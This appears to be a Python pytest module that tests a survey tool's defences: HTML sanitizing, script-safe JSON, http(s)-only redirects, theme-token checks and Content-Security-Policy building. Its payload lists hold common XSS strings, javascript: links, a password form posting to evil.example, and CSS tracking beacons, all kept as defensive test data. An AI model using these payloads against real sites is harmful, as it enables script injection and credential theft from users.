"""What an author writes cannot run in a respondent's browser.

A survey's texts, a page's HTML body, its theme and the addresses it sends a
respondent to are the author's — or a third party's, through an import — and
all of them reach the survey's page, on an origin that may hold other
surveys' answers. Each path is closed where it is made:

* every text travels in the page's inline ``<script>`` as JSON that cannot
  end the element (``json_for_script``);
* a body is shown as ``sanitize_html`` keeps it (formatting, links,
  pictures, media, YouTube and Vimeo players — no script, frame, form or
  page-wide style), and the importers keep the same of what they bring in;
* an address a respondent is sent to or opens is ``http(s)`` (the model
  refuses any other);
* a theme token has a strict format, and a stylesheet cannot end a ``<style>``;
* the pages carry a Content-Security-Policy when the host gives one.

The payloads below are the ones an attacker tries first; ``__pwned`` marks
the ones that would run. The browser tests (``test_runtime_security.py``)
play them in Chromium.
"""

from __future__ import annotations

import base64
import copy
import hashlib
import json
import re
from html.parser import HTMLParser
from pathlib import Path
from typing import Any

import pytest

from siamang.core import Page, Questionnaire, RedirectPage
from siamang.core.safe_html import (
    MAX_ATTRIBUTES,
    MAX_HTML_LENGTH,
    embed_src,
    json_for_script,
    sanitize_html,
    sanitize_html_report,
)
from siamang.core.safe_url import navigation_url, navigation_url_problem
from siamang.frontend import ClientEnv, FrontendBuilder, ReactRuntime, UIConfig
from siamang.frontend.compiler import compile_questionnaire
from siamang.frontend.compiler.react import compile_react_payload
from siamang.frontend.csp import (
    PLAYER_ORIGINS,
    csp_meta,
    inline_script_hashes,
    insert_csp_meta,
    survey_csp,
)
from siamang.frontend.runtime.base import RuntimeRenderContext
from siamang.frontend.schema import SurveySchema
from siamang.frontend.theme.css import compile_css
from siamang.frontend.theme.tokens import (
    color_problem,
    css_text,
    font_stack_problem,
    length_problem,
)
from siamang.model import DocumentError, from_document, validate_document
from siamang.model._import_safety import imported_html
from siamang.model.import_lss import import_lss
from siamang.model.import_qsf import import_qsf
from siamang.model.import_surveyjs import import_surveyjs

FIXTURES = Path(__file__).resolve().parent / "fixtures"

# ── The payloads ─────────────────────────────────────────────────────────────

#: Text that would close the inline <script> the survey's data travels in.
TEXT_PAYLOADS = [
    "</script><script>window.__pwned=1</script>",
    "</SCRIPT ><script>window.__pwned=1</script>",
    "<!--</script><script>window.__pwned=1</script>-->",
    "a\u2028b\u2029c",
    "<img src=x onerror=window.__pwned=1>",
    '"; window.__pwned=1; //',
]

#: A page body's HTML that runs a script, loads a page into the survey,
#: sends a form or changes the page around it.
BODY_PAYLOADS = [
    "<img src=x onerror=window.__pwned=1>",
    '<img src=x onerror="&#119;indow.__pwned=1">',
    "<svg onload=window.__pwned=1><circle r=1></circle></svg>",
    "<svg><svg onload=window.__pwned=1></svg></svg>",
    '<iframe srcdoc="<script>parent.__pwned=1</script>"></iframe>',
    '<a href="javascript:window.__pwned=1">x</a>',
    '<a href=" JaVaScRiPt:window.__pwned=1">x</a>',
    '<a href="java&#x09;script:window.__pwned=1">x</a>',
    '<a href="jav&#x61;script:window.__pwned=1">x</a>',
    '<a href="javascript&colon;window.__pwned=1">x</a>',
    '<a href="&#14;javascript:window.__pwned=1">x</a>',
    '<a href="vbscript:msgbox(1)">x</a>',
    '<a href="data:text/html,<script>window.__pwned=1</script>">x</a>',
    "<form action=https://evil.example/collect><input name=pw type=password>"
    "<button>Send</button></form>",
    '<meta http-equiv=refresh content="0;url=https://evil.example/">',
    '<base href="https://evil.example/">',
    '<link rel=stylesheet href="https://evil.example/x.css">',
    "<style>@import url(https://evil.example/x.css); body{display:none}</style>",
    '<object data="https://evil.example/x.swf"></object>',
    '<embed src="https://evil.example/x.swf">',
    '<math><mi xlink:href="javascript:window.__pwned=1">x</mi></math>',
    "<details open ontoggle=window.__pwned=1><summary>s</summary>d</details>",
    '<noscript><p title="</noscript><img src=x onerror=window.__pwned=1>"></noscript>',
    '<iframe src="https://evil.example/phish"></iframe>',
    "<script>window.__pwned=1</script>",
    "<scr<script>ipt>window.__pwned=1</script>",
    "<textarea><img src=x onerror=window.__pwned=1></textarea>",
    '<p style="background:url(https://evil.example/p.gif)">t</p>',
    '<p style="position:fixed;top:0;left:0;width:100%;height:100%">cover</p>',
    '<p style="background:u\\72l(https://evil.example/p.gif)">t</p>',
    '<p style="position:fi\\78ed;top:0;left:0;width:100%;height:100%">cover</p>',
    "<p style=\"font-family:'x;}</style><script>window.__pwned=1</script>'\">t</p>",
    '<img src="data:image/svg+xml,<svg onload=window.__pwned=1>">',
    '<div id="SIAMANG_DESIGN">clobber</div>',
    '<a href="{answer:link}">piped scheme</a>',
]

#: Payloads written for a filter that looks for "<script": text to a browser.
_READ_AS_TEXT = {"<scr<script>ipt>window.__pwned=1</script>"}

#: Navigation addresses that are not http(s), however they are spelled.
URL_PAYLOADS = [
    "javascript:window.__pwned=1",
    " javascript:window.__pwned=1",
    "\tjavascript:window.__pwned=1",
    "java\tscript:window.__pwned=1",
    "JaVaScRiPt:window.__pwned=1",
    "vbscript:msgbox(1)",
    "data:text/html,<script>window.__pwned=1</script>",
    "jav&#x61;script:window.__pwned=1",
    "{url:next}",
    "java{url:s}script:alert(1)",
    "//evil.example/",
    "www.example.com",
    "https:/example.com",
    "https:///example.com",
    "file:///etc/passwd",
]

#: Theme tokens that would end their declaration.
TOKEN_PAYLOADS = [
    "red;} body{background:url(https://evil.example/p.gif)} :root{",
    "</style><script>window.__pwned=1</script>",
    "#fff;background:url(https://evil.example/p.gif)",
    "rgb(0 0 0) url(https://evil.example/p.gif)",
    "expression(alert(1))",
    "var(--x)",
]
FONT_PAYLOADS = [
    "Arial; } body { background: url(https://evil.example/p.gif) } :root {",
    "url(https://evil.example/font.woff2)",
    '"Inter", serif; --x: 1',
    "Georgia \\3b",
    "@import x",
    "</style><script>window.__pwned=1</script>",
]

# What a body may keep, exactly as it is.
LEGITIMATE = {
    "<p>Please read <b>carefully</b> and <i>slowly</i>.</p>": None,
    '<h2 align="center">Welcome</h2><ul><li>one</li><li>two</li></ul><ol start="3"><li>three</li></ol>': None,
    '<p><a href="https://example.org/info?a=1&amp;region=eu">info</a> '
    '<a href="mailto:team@example.org">mail</a> <a href="tel:+15550100">call</a> '
    '<a href="#consent">jump</a></p>': None,
    '<p><img src="https://cdn.example.org/logo.png" alt="Logo" width="120" height="40"></p>': None,
    '<img src="data:image/png;base64,iVBORw0KGgo=" alt="dot">': None,
    '<table border="1"><thead><tr><th scope="col">A</th></tr></thead>'
    '<tbody><tr><td colspan="2">1</td></tr></tbody></table>': None,
    '<p style="text-align: center; color: #335577; font-size: 1.2em">Styled</p>': None,
    "<details open><summary>More</summary><p>Hidden detail</p></details>": None,
    '<video src="https://cdn.example.org/clip.mp4" controls width="320">'
    '<track src="https://cdn.example.org/clip.vtt" kind="captions" srclang="en"></video>': None,
    '<audio src="https://cdn.example.org/a.mp3" controls></audio>': None,
    "<p>Hello {answer:name}, you chose <b>{label:fruit}</b>.</p>": None,
    '<p><a href="https://panel.example/next?id={answer:pid}">Continue</a></p>': None,
    '<blockquote cite="https://example.org/source">Quote</blockquote>': None,
    "<p>Fish &amp; chips &lt; 5 &gt; 3  </p>": None,
    '<div id="consent" class="note" data-step="1" aria-label="Consent">Consent</div>': None,
    '<font color="red" face="Arial">legacy</font>': None,
}


def _visible(html: str) -> dict[str, Any]:
    """What a browser would build from ``html``: the elements and attributes
    (by an independent reading), to check nothing scriptable is left."""

    found: dict[str, Any] = {"tags": [], "attrs": []}

    class Reader(HTMLParser):
        def handle_starttag(self, tag, attrs):  # type: ignore[no-untyped-def]
            found["tags"].append(tag)
            found["attrs"].extend((tag, name, value or "") for name, value in attrs)

        handle_startendtag = handle_starttag

    reader = Reader(convert_charrefs=True)
    reader.feed(html)
    reader.close()
    return found


_SCRIPTABLE_TAGS = {
    "script",
    "style",
    "svg",
    "math",
    "object",
    "embed",
    "applet",
    "form",
    "input",
    "button",
    "select",
    "textarea",
    "meta",
    "link",
    "base",
    "frame",
    "frameset",
    "template",
    "noscript",
}


def _assert_harmless(html: str) -> None:
    seen = _visible(html)
    assert not _SCRIPTABLE_TAGS & set(seen["tags"]), html
    for tag, name, value in seen["attrs"]:
        assert not name.startswith("on"), html
        assert name not in {"srcdoc", "action", "formaction"}, html
        squashed = re.sub(r"[\x00-\x20]", "", value).lower()
        assert not squashed.startswith(("javascript:", "vbscript:")), html
        if name in {"href", "src"} and squashed.startswith("data:"):
            assert tag == "img" and re.match(r"data:image/(png|jpe?g|gif|webp|avif|bmp)", squashed)
        if tag == "iframe" and name == "src":
            assert value.startswith(
                ("https://www.youtube-nocookie.com/embed/", "https://player.vimeo.com/video/")
            )
        if name == "style":
            assert "url(" not in value and "fixed" not in value
        if name == "id":
            assert not value.lower().startswith("siamang")


# ── The body's HTML ──────────────────────────────────────────────────────────


@pytest.mark.parametrize("payload", BODY_PAYLOADS)
def test_a_body_keeps_nothing_that_runs_or_changes_the_page(payload):
    report = sanitize_html_report(payload)
    _assert_harmless(report.html)
    if payload in _READ_AS_TEXT:
        # A browser reads no script here either: a tag named "scr<script".
        assert "<script" not in report.html and "__pwned" in report.html
        return
    # What was taken out is said, and named as dangerous.
    assert report.dangerous, payload
    assert all(item.message.endswith(".") for item in report.removed)


@pytest.mark.parametrize("html", list(LEGITIMATE))
def test_legitimate_formatting_links_pictures_and_media_stay_as_they_are(html):
    report = sanitize_html_report(html)
    assert report.removed == ()
    assert _visible(report.html) == _visible(html)


@pytest.mark.parametrize("html", BODY_PAYLOADS + list(LEGITIMATE))
def test_sanitizing_is_idempotent(html):
    once = sanitize_html(html)
    again = sanitize_html_report(once)
    assert again.html == once
    assert again.removed == ()


def test_a_youtube_or_vimeo_player_stays_rebuilt_on_its_own_address():
    youtube = (
        '<iframe width="560" height="315" '
        'src="https://www.youtube.com/embed/aBcDeFgHiJ0?si=TRACK&amp;start=10" '
        'title="My clip" frameborder="0" allow="autoplay" sandbox="allow-top-navigation" '
        'onload="window.__pwned=1" allowfullscreen></iframe>'
    )
    report = sanitize_html_report(youtube)
    assert report.html == (
        '<iframe src="https://www.youtube-nocookie.com/embed/aBcDeFgHiJ0?start=10" '
        'width="560" height="315" frameborder="0" title="My clip" allow="accelerometer; '
        "autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; "
        'web-share; fullscreen" allowfullscreen referrerpolicy="strict-origin-when-cross-origin" '
        'loading="lazy"></iframe>'
    )
    assert [item.attribute for item in report.removed] == ["onload"]
    vimeo = sanitize_html(
        '<iframe src="https://player.vimeo.com/video/123456789?h=0a1b2c3d4e&badge=0&app_id=12345" '
        'width="640" height="360"></iframe>'
    )
    assert vimeo.startswith(
        '<iframe src="https://player.vimeo.com/video/123456789?h=0a1b2c3d4e&amp;badge=0" '
        'width="640" height="360" title="Vimeo video player"'
    )
    assert 'referrerpolicy="strict-origin-when-cross-origin"' in vimeo


@pytest.mark.parametrize(
    ("given", "src"),
    [
        (
            "https://www.youtube.com/watch?v=aBcDeFgHiJ0&t=1m30s",
            "https://www.youtube-nocookie.com/embed/aBcDeFgHiJ0?start=90",
        ),
        (
            "https://youtu.be/aBcDeFgHiJ0?si=abc",
            "https://www.youtube-nocookie.com/embed/aBcDeFgHiJ0",
        ),
        (
            "//www.youtube-nocookie.com/embed/aBcDeFgHiJ0?rel=0",
            "https://www.youtube-nocookie.com/embed/aBcDeFgHiJ0?rel=0",
        ),
        (
            "https://www.youtube.com/shorts/aBcDeFgHiJ0",
            "https://www.youtube-nocookie.com/embed/aBcDeFgHiJ0",
        ),
        (
            "https://www.youtube.com/embed/videoseries?list=PLabc",
            "https://www.youtube-nocookie.com/embed/videoseries?list=PLabc",
        ),
        ("https://vimeo.com/123456789", "https://player.vimeo.com/video/123456789"),
        (
            "https://vimeo.com/123456789/0123abcdef",
            "https://player.vimeo.com/video/123456789?h=0123abcdef",
        ),
        (
            "https://player.vimeo.com/video/1?autoplay=1#t=1m2s",
            "https://player.vimeo.com/video/1?autoplay=1#t=1m2s",
        ),
    ],
)
def test_a_players_address_is_rebuilt_from_the_videos_id(given, src):
    assert embed_src(given) == ("youtube" if "you" in given else "vimeo", src)


@pytest.mark.parametrize(
    "given",
    [
        "https://youtube.com.evil.example/embed/aBcDeFgHiJ0",
        "https://evil.example/www.youtube.com/embed/aBcDeFgHiJ0",
        "https://user@www.youtube.com/embed/aBcDeFgHiJ0",
        "https://www.youtube.com:8443/embed/aBcDeFgHiJ0",
        "https://www.youtube.com/embed/<script>",
        "javascript://www.youtube.com/embed/aBcDeFgHiJ0",
        "https://vimeo.com/about",
        'https://player.vimeo.com/video/1"onload="x',
    ],
)
def test_nothing_else_is_a_player(given):
    assert embed_src(given) is None


def test_attribute_values_read_as_a_browser_reads_them():
    # "&region=" stays: a browser does not decode a legacy name followed by "=".
    html = '<a href="https://example.org/?a=1&region=eu&copy=2&amp;x=&lt;">l</a>'
    report = sanitize_html_report(html)
    assert (
        report.html
        == '<a href="https://example.org/?a=1&amp;region=eu&amp;copy=2&amp;x=&lt;">l</a>'
    )
    assert report.removed == ()


def test_a_link_opening_a_new_window_cannot_reach_back():
    assert sanitize_html(
        '<a href="https://x.example" target="_BLANK" rel="nofollow stylesheet">x</a>'
    ) == ('<a href="https://x.example" target="_blank" rel="nofollow noopener noreferrer">x</a>')


def test_the_noscript_trick_is_read_as_the_browser_reads_it():
    report = sanitize_html_report(
        '<noscript><p title="</noscript><img src=x onerror=window.__pwned=1>"></noscript>'
    )
    # A browser (scripting on) reads <noscript>'s content as text up to the
    # first "</noscript>" — inside the title — and then an <img onerror>.
    _assert_harmless(report.html)
    assert report.html.startswith('<img src="x">')
    assert "onerror" in {item.attribute for item in report.removed}


def test_what_was_removed_is_said_in_words():
    report = sanitize_html_report(
        '<p onclick="x()">Hi <a href="javascript:steal()">here</a></p><script>x()</script>'
        '<o:p></o:p><iframe src="https://evil.example/"></iframe>'
    )
    assert report.html == "<p>Hi <a>here</a></p>"
    # Each a sentence of its own, to be joined with spaces.
    assert report.messages() == [
        "The onclick attribute of <p> removed: it would run a script.",
        "The href “javascript:steal()” of <a> removed: it would run a script.",
        "<script> removed: it would run a script.",
        "<o:p> removed (its text is kept): not something a page's body can hold.",
        "<iframe> “https://evil.example/” removed: only YouTube and Vimeo players are embedded.",
    ]
    # A removal's own message is the clause, for an editor that words it.
    assert report.removed[0].message == (
        "the onclick attribute of <p> removed: it would run a script."
    )
    # Word's <o:p> changes nothing a respondent sees: it is not dangerous.
    assert [item.element for item in report.removed if not item.dangerous] == ["o:p"]
    assert len(report.messages(dangerous_only=True)) == 4


def test_a_style_written_in_css_escapes_is_said_to_be_dangerous():
    # u\72l( is url( and fi\78ed is fixed to a browser: dropped like the
    # spelled-out ones, and the author is told, not left with a quiet loss.
    report = sanitize_html_report(
        '<p style="color:red;background:u\\72l(https://evil.example/p.gif)">t</p>'
        '<p style="font-family:\\5FAE\\8F6F\\96C5\\9ED1;transform:rotate(2deg)">u</p>'
    )
    assert report.html == '<p style="color: red">t</p><p>u</p>'
    assert [(item.reason, item.dangerous) for item in report.removed] == [
        ("style_escape", True),
        ("style_escape", True),
        ("unsupported", False),
    ]
    assert report.messages()[0] == (
        "The style “background: u\\72l(https://evil.example/p.gif)” of <p> removed: a CSS "
        "escape or a character that ends a declaration can hide what a style does; write "
        "the value out plainly."
    )


def test_an_answer_cannot_supply_a_links_scheme():
    report = sanitize_html_report('<a href="{answer:url}">x</a><a href="{var:u}/path">y</a>')
    assert report.html == "<a>x</a><a>y</a>"
    assert {item.reason for item in report.removed} == {"piped_url"}


def test_the_compilers_send_the_sanitized_body():
    survey = Questionnaire(
        title="T",
        pages=[
            Page(name="p1", body='<p onclick="x">Hi</p><img src=x onerror=y>'),
            RedirectPage("end", redirect_url=" https://panel.example/done?id={url:pid}\n"),
        ],
    )
    react = compile_react_payload(survey)["PAGES"]
    assert react[0]["body"] == '<p>Hi</p><img src="x">'
    assert react[1]["redirectUrl"] == "https://panel.example/done?id={url:pid}"
    schema = compile_questionnaire(survey).pages
    assert schema[0]["body"] == '<p>Hi</p><img src="x">'
    # The document keeps what the author wrote.
    assert survey.pages[0].body == '<p onclick="x">Hi</p><img src=x onerror=y>'


def test_the_surveyjs_completion_message_is_text():
    """SurveyJS draws completedHtml as HTML: the completion message goes in
    as text, as the React runtime shows it."""

    schema = SurveySchema(
        title="T",
        pages=[],
        variables={},
        completion_text="<img src=x onerror=alert(1)> Thanks & see you, 'friend'",
    )
    assert schema.to_surveyjs()["completedHtml"] == (
        "<h3>&lt;img src=x onerror=alert(1)&gt; Thanks &amp; see you, 'friend'</h3>"
    )


def test_the_lint_names_what_a_body_loses():
    survey = Questionnaire(
        title="T",
        pages=[
            Page(name="intro", body="<p>Hi<script>x()</script></p><o:p></o:p>"),
            Page(name="clean", body="<p>Hi <b>there</b></p>"),
        ],
    )
    found = [w for w in survey.lint() if w.code == "BODY_HTML_REMOVED"]
    assert len(found) == 1
    assert found[0].location == "intro" and found[0].severity == "warning"
    assert "<script> removed: it would run a script." in found[0].message
    assert "o:p" not in found[0].message  # harmless formatting is not a warning


def test_the_lint_writes_what_a_body_loses_in_sentences():
    survey = Questionnaire(
        title="T",
        pages=[Page(name="intro", body='<p onclick="x()">Hi</p><img src=x onerror=y>')],
    )
    found = [w for w in survey.lint() if w.code == "BODY_HTML_REMOVED"]
    assert len(found) == 1
    assert found[0].message == (
        "Page 'intro': its body is shown without what could run a script or change the "
        "page. The onclick attribute of <p> removed: it would run a script. The onerror "
        "attribute of <img> removed: it would run a script."
    )


# ── What sanitizing costs ────────────────────────────────────────────────────


def test_a_body_longer_than_a_body_may_be_is_refused():
    longest = "<p>" + "x" * (MAX_HTML_LENGTH - 7) + "</p>"
    assert sanitize_html(longest) == longest
    with pytest.raises(ValueError, match=r"1,000,001 characters long, more than the 1,000,000"):
        sanitize_html_report(longest + "x")
    with pytest.raises(ValueError, match="the body is 1,000,001 characters long"):
        Page(name="p", body=longest + "x")
    document = _payload_document()
    document["pages"][0]["body"] = longest + "x"
    with pytest.raises(DocumentError, match="^page 'p1': the body is 1,000,001 characters"):
        from_document(document)
    # The schema says so too, in a line, without quoting the megabyte back.
    with pytest.raises(DocumentError) as raised:
        validate_document(document)
    assert str(raised.value) == (
        "pages/0/body: is 1,000,001 characters long, more than the 1,000,000 it may have"
    )


def test_an_import_leaves_out_html_longer_than_a_body_may_be():
    warnings: list[str] = []
    assert imported_html("<p>" + "x" * MAX_HTML_LENGTH + "</p>", "page 'p'", warnings) == ""
    assert warnings == [
        "page 'p': HTML left out. The HTML is 1,000,007 characters long, more than the "
        "1,000,000 a page's body may have; show a picture from its https:// address rather "
        "than writing it into the body."
    ]
    # Escaping can lengthen what is kept: that is left out too.
    warnings.clear()
    assert imported_html("<" * (MAX_HTML_LENGTH // 2), "page 'q'", warnings) == ""
    assert warnings and "HTML left out. The HTML is 2,000,000 characters long" in warnings[0]


def test_an_element_with_hundreds_of_attributes_is_dropped_without_being_read():
    # Within a short tag: the element goes, its text stays.
    many = " ".join(f"a{i}" for i in range(MAX_ATTRIBUTES + 1))
    report = sanitize_html_report(f"<b {many}>t</b><i>u</i>")
    assert report.html == "t</b><i>u</i>"
    assert [(r.element, r.reason, r.dangerous, r.kept_content) for r in report.removed] == [
        ("b", "attributes", False, True)
    ]
    assert report.messages() == [
        "<b> removed (its text is kept): an element of a page's body has a few "
        "attributes, not hundreds."
    ]
    # As many as an element may have: read as usual.
    fewer = " ".join(f"data-a{i}" for i in range(MAX_ATTRIBUTES))
    assert sanitize_html_report(f"<b {fewer}>t</b>").removed == ()
    # A script or a frame with too many is still dropped with its content.
    report = sanitize_html_report("<script " + "x " * 2000 + ">window.__pwned=1</script><p>ok</p>")
    assert report.html == "<p>ok</p>"
    assert [(r.element, r.reason, r.dangerous) for r in report.removed] == [
        ("script", "script", True)
    ]
    assert sanitize_html("<iframe " + "x " * 2000 + "><p>fallback</p></iframe>ok") == "ok"
    # A <style>'s text is its own up to </style>, as a browser reads it; an
    # empty "<svg …/>" has nothing to skip.
    assert sanitize_html("<style " + "x " * 2000 + "><p>no</p></style><p>ok</p>") == "<p>ok</p>"
    assert sanitize_html("<svg " + "x " * 2000 + "/><p>after</p>") == "<p>after</p>"
    # A megabyte of attributes costs neither the parser's memory nor its time.
    import time
    import tracemalloc

    payload = "<a " + "x=y " * ((MAX_HTML_LENGTH - 20) // 4) + ">t</a>"
    tracemalloc.start()
    started = time.perf_counter()
    try:
        assert sanitize_html(payload) == "t</a>"
        _, peak = tracemalloc.get_traced_memory()
    finally:
        tracemalloc.stop()
    assert peak < 5_000_000, peak  # the parser alone took ~160 MB
    assert time.perf_counter() - started < 10
    # A tag that never ends is dropped with the rest of the input.
    assert sanitize_html("<p>a</p><a " + "x " * 200) == "<p>a</p>"


def test_a_report_keeps_each_removal_once_and_a_few_hundred_at_most():
    report = sanitize_html_report("<b onclick=x>y</b>" * 2000)
    assert report.html == "<b>y</b>" * 2000
    assert len(report.removed) == 1
    report = sanitize_html_report("".join(f"<b on{i}=x>y</b>" for i in range(2000)))
    assert len(report.removed) == 500 and all(r.dangerous for r in report.removed)
    # What is dangerous is reported after any amount of harmless formatting.
    report = sanitize_html_report(
        "".join(f"<b x{i}=1>t</b>" for i in range(2000)) + "<img src=x onerror=y>"
    )
    assert len(report.removed) == 501
    assert [r.attribute for r in report.dangerous] == ["onerror"]


# ── Text in the inline script ────────────────────────────────────────────────


def test_json_for_script_reads_back_the_same_and_cannot_end_a_script():
    value = {"t": TEXT_PAYLOADS, "n": [1, 2.5, None, True]}
    text = json_for_script(value)
    assert json.loads(text) == value
    assert not re.search(r"[<>&\u2028\u2029]", text)


def _payload_document() -> dict[str, Any]:
    """Every text a respondent reads holds a payload."""

    labels = [{"code": i + 1, "label": text} for i, text in enumerate(TEXT_PAYLOADS)]
    return {
        "schema_version": "1.0",
        "title": TEXT_PAYLOADS[0],
        "variables": {"q": {"scale": "nominal", "labels": labels, "label": TEXT_PAYLOADS[1]}},
        "pages": [
            {
                "name": "p1",
                "title": TEXT_PAYLOADS[2],
                "items": [
                    {"type": "SingleChoice", "id": "q", "var": "q", "text": TEXT_PAYLOADS[1]}
                ],
            }
        ],
        "ui": {
            "institution_name": TEXT_PAYLOADS[0],
            "next_button_text": TEXT_PAYLOADS[1],
            "completion_title": TEXT_PAYLOADS[2],
            "ethics_statement": TEXT_PAYLOADS[5],
        },
    }


def _bundle(document: dict[str, Any], *, csp: str | None = None) -> dict[str, str | bytes]:
    from .test_runtime_browser import _RecordingClient

    loaded = from_document(document)
    options = dict(loaded.options)
    ui = options.pop("ui", None) or UIConfig()
    schema = compile_questionnaire(loaded.survey, options=options)
    env = ClientEnv(survey_id="t", backend="test", settings={})
    bundle = FrontendBuilder(ui=ui, runtime=ReactRuntime(), csp=csp).build(
        schema, client=_RecordingClient(), env=env, survey=loaded.survey
    )
    return bundle.files


def test_no_text_ends_the_pages_script():
    page = str(_bundle(_payload_document())["index.html"])
    scripts = re.findall(r"<script>(.*?)</script>", page, re.DOTALL)
    assert len(scripts) == 1
    assert "<" not in scripts[0] and "\u2028" not in scripts[0]
    # The texts read back exactly as written.
    survey = json.loads(re.search(r"window\.SURVEY = (.*?);\n", scripts[0]).group(1))
    pages = json.loads(re.search(r"window\.PAGES  = (.*?);\n", scripts[0]).group(1))
    assert survey["title"] == TEXT_PAYLOADS[0]
    assert survey["nextButtonText"] == TEXT_PAYLOADS[1]
    assert [o["label"] for o in pages[0]["items"][0]["options"]][
        : len(TEXT_PAYLOADS)
    ] == TEXT_PAYLOADS
    # Nothing outside the one script runs: the page's only other scripts load files.
    assert len(re.findall(r"<script\b", page, re.IGNORECASE)) == 1 + len(
        re.findall(r"<script\b[^>]*\bsrc=", page, re.IGNORECASE)
    )


# ── Addresses a respondent is sent to ────────────────────────────────────────


@pytest.mark.parametrize("url", URL_PAYLOADS)
def test_only_http_addresses_send_a_respondent_anywhere(url):
    assert navigation_url_problem(url)
    assert navigation_url(url) is None
    with pytest.raises(ValueError, match="redirect_url"):
        Page(name="end", kind="final", redirect_url=url)
    for field in (
        "redirect_url",
        "screen_out_redirect_url",
        "quota_full_redirect_url",
        "privacy_url",
    ):
        with pytest.raises(ValueError, match=field):
            UIConfig(**{field: url})


@pytest.mark.parametrize(
    "url",
    [
        "https://panel.example/complete?id={url:pid}&s={answer:q1}",
        "HTTPS://Example.org/x",
        "http://intranet.example/thanks",
        "https://{url:host}/done",
        "  https://example.org/padded\n",
        "",
        None,
    ],
)
def test_an_http_address_and_a_template_are_fine(url):
    assert navigation_url_problem(url) is None
    Page(name="end", kind="final", redirect_url=url)
    UIConfig(redirect_url=url, privacy_url=url)


def test_a_document_with_a_script_address_does_not_load():
    document = {
        "schema_version": "1.0",
        "title": "T",
        "pages": [{"name": "end", "kind": "final", "redirect_url": "javascript:alert(1)"}],
    }
    with pytest.raises(DocumentError, match="redirect_url.*javascript"):
        from_document(document)
    document["pages"][0]["redirect_url"] = "https://ok.example/"
    document["ui"] = {"privacy_url": "data:text/html,<b>x</b>"}
    with pytest.raises(DocumentError, match="ui: privacy_url"):
        from_document(document)


def test_the_lint_asks_for_https():
    survey = Questionnaire(title="T", pages=[RedirectPage("end", redirect_url="http://p.example/")])
    ui = UIConfig(privacy_url="http://uni.example/privacy", redirect_url="https://ok.example/")
    found = [(w.code, w.location) for w in survey.lint(ui=ui) if w.code == "URL_NOT_HTTPS"]
    assert found == [("URL_NOT_HTTPS", "end"), ("URL_NOT_HTTPS", "ui.privacy_url")]


# ── The theme ────────────────────────────────────────────────────────────────


@pytest.mark.parametrize("value", TOKEN_PAYLOADS)
def test_a_color_or_a_size_cannot_write_css_of_its_own(value):
    assert color_problem(value)
    assert length_problem(value)
    for field in ("primary_color", "background_color", "warn_color", "error_soft_color"):
        with pytest.raises(ValueError, match=field):
            UIConfig(**{field: value})
    for field in ("font_size", "width", "radius", "line_height"):
        with pytest.raises(ValueError, match=field):
            UIConfig(**{field: value})


@pytest.mark.parametrize("value", FONT_PAYLOADS)
def test_a_font_stack_cannot_write_css_of_its_own(value):
    assert font_stack_problem(value)
    for field in ("font_family", "heading_font_family", "ui_font_family", "mono_font_family"):
        with pytest.raises(ValueError, match=field):
            UIConfig(**{field: value})


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("primary_color", "#2C5F8A"),
        ("primary_color", "#abc"),
        ("primary_color", "#2c5f8a80"),
        ("accent_color", "rgb(44, 95, 138)"),
        ("accent_color", "rgb(44 95 138 / 50%)"),
        ("text_color", "hsl(210deg 40% 30%)"),
        ("border_color", "rebeccapurple"),
        ("border_color", "transparent"),
        ("surface_color", "oklch(0.7 0.1 250)"),
        ("font_size", "15.5px"),
        ("font_size", "1.1rem"),
        ("width", "60%"),
        ("width", "min(90vw, 760px)"),
        ("width", "calc(100% - 2rem)"),
        ("radius", "0"),
        ("line_height", "1.6"),
        ("line_height", "normal"),
        ("font_family", '"Source Serif 4", Georgia, serif'),
        ("ui_font_family", "-apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui"),
        ("mono_font_family", "Menlo, monospace"),
        ("heading_font_family", '"Roboto Slab", Times New Roman, serif'),
    ],
)
def test_the_tokens_a_theme_uses_are_fine(field, value):
    UIConfig(**{field: value})


def test_every_preset_and_default_passes():
    from siamang.frontend.theme.presets import THEME_PRESETS

    for preset in THEME_PRESETS.values():
        UIConfig(**{f: getattr(preset, f) for f in preset.__dataclass_fields__})


def test_a_stylesheet_cannot_end_a_style_element():
    ui = UIConfig(custom_css="p { content: '</style><script>window.__pwned=1</script>' }")
    context = RuntimeRenderContext(
        schema=compile_questionnaire(Questionnaire(title="T", pages=[Page(name="p")])), ui=ui
    )
    for css in (ReactRuntime().stylesheet(context), compile_css(ui)):
        assert "</style" not in css.lower()
        assert "<\\/style>" in css  # CSS reads "\/" as "/": the rule is unchanged
    assert css_text("a</b") == "a<\\/b"


def test_a_token_that_got_past_the_model_is_written_as_the_default():
    ui = UIConfig()
    object.__setattr__(
        ui, "primary_color", "red;} body{background:url(https://evil.example/p)} :root{"
    )
    object.__setattr__(ui, "font_size", "1px;}*{")
    context = RuntimeRenderContext(
        schema=compile_questionnaire(Questionnaire(title="T", pages=[Page(name="p")])), ui=ui
    )
    for css in (ReactRuntime().stylesheet(context), compile_css(ui)):
        assert "evil.example" not in css and "1px;}" not in css
        assert re.search(r"--siamang-primary:\s*#2c5f8a;", css)


# ── The policy ───────────────────────────────────────────────────────────────


def test_the_policy_says_what_the_runtime_needs():
    policy = survey_csp(connect_src=["https://ingest.example.org"], captcha=True)
    directives = dict(part.split(" ", 1) for part in policy.split("; "))
    assert directives["default-src"] == "'none'"
    assert directives["script-src"] == (
        "'self' 'unsafe-eval' 'unsafe-inline' https://challenges.cloudflare.com"
    )
    assert directives["style-src"] == "'self' 'unsafe-inline'"
    assert directives["img-src"] == directives["media-src"] == "'self' https: data:"
    assert directives["frame-src"] == " ".join(
        [*PLAYER_ORIGINS, "https://challenges.cloudflare.com"]
    )
    assert directives["connect-src"] == "'self' https://ingest.example.org"
    assert (
        directives["object-src"] == directives["base-uri"] == directives["form-action"] == "'none'"
    )


def test_a_script_in_a_stylesheet_or_a_comment_is_not_hashed_for_the_real_one():
    real = "window.SURVEY = {};"
    digest = base64.b64encode(hashlib.sha256(real.encode()).digest()).decode()
    page = (
        '<!doctype html><html><head><meta charset="utf-8">'
        "<style>/* <script */ a { color: red } /* <script>x</script> */</style>"
        "<!-- <script>y</script> -->"
        f'</head><body><script>{real}</script><script src="bundle.js"></script>'
        "</body></html>"
    )
    assert inline_script_hashes(page) == [f"'sha256-{digest}'"]
    # Line breaks are hashed as a browser reads them.
    crlf = page.replace(real, "window.SURVEY\r\n= {};")
    lf = base64.b64encode(hashlib.sha256(b"window.SURVEY\n= {};").digest()).decode()
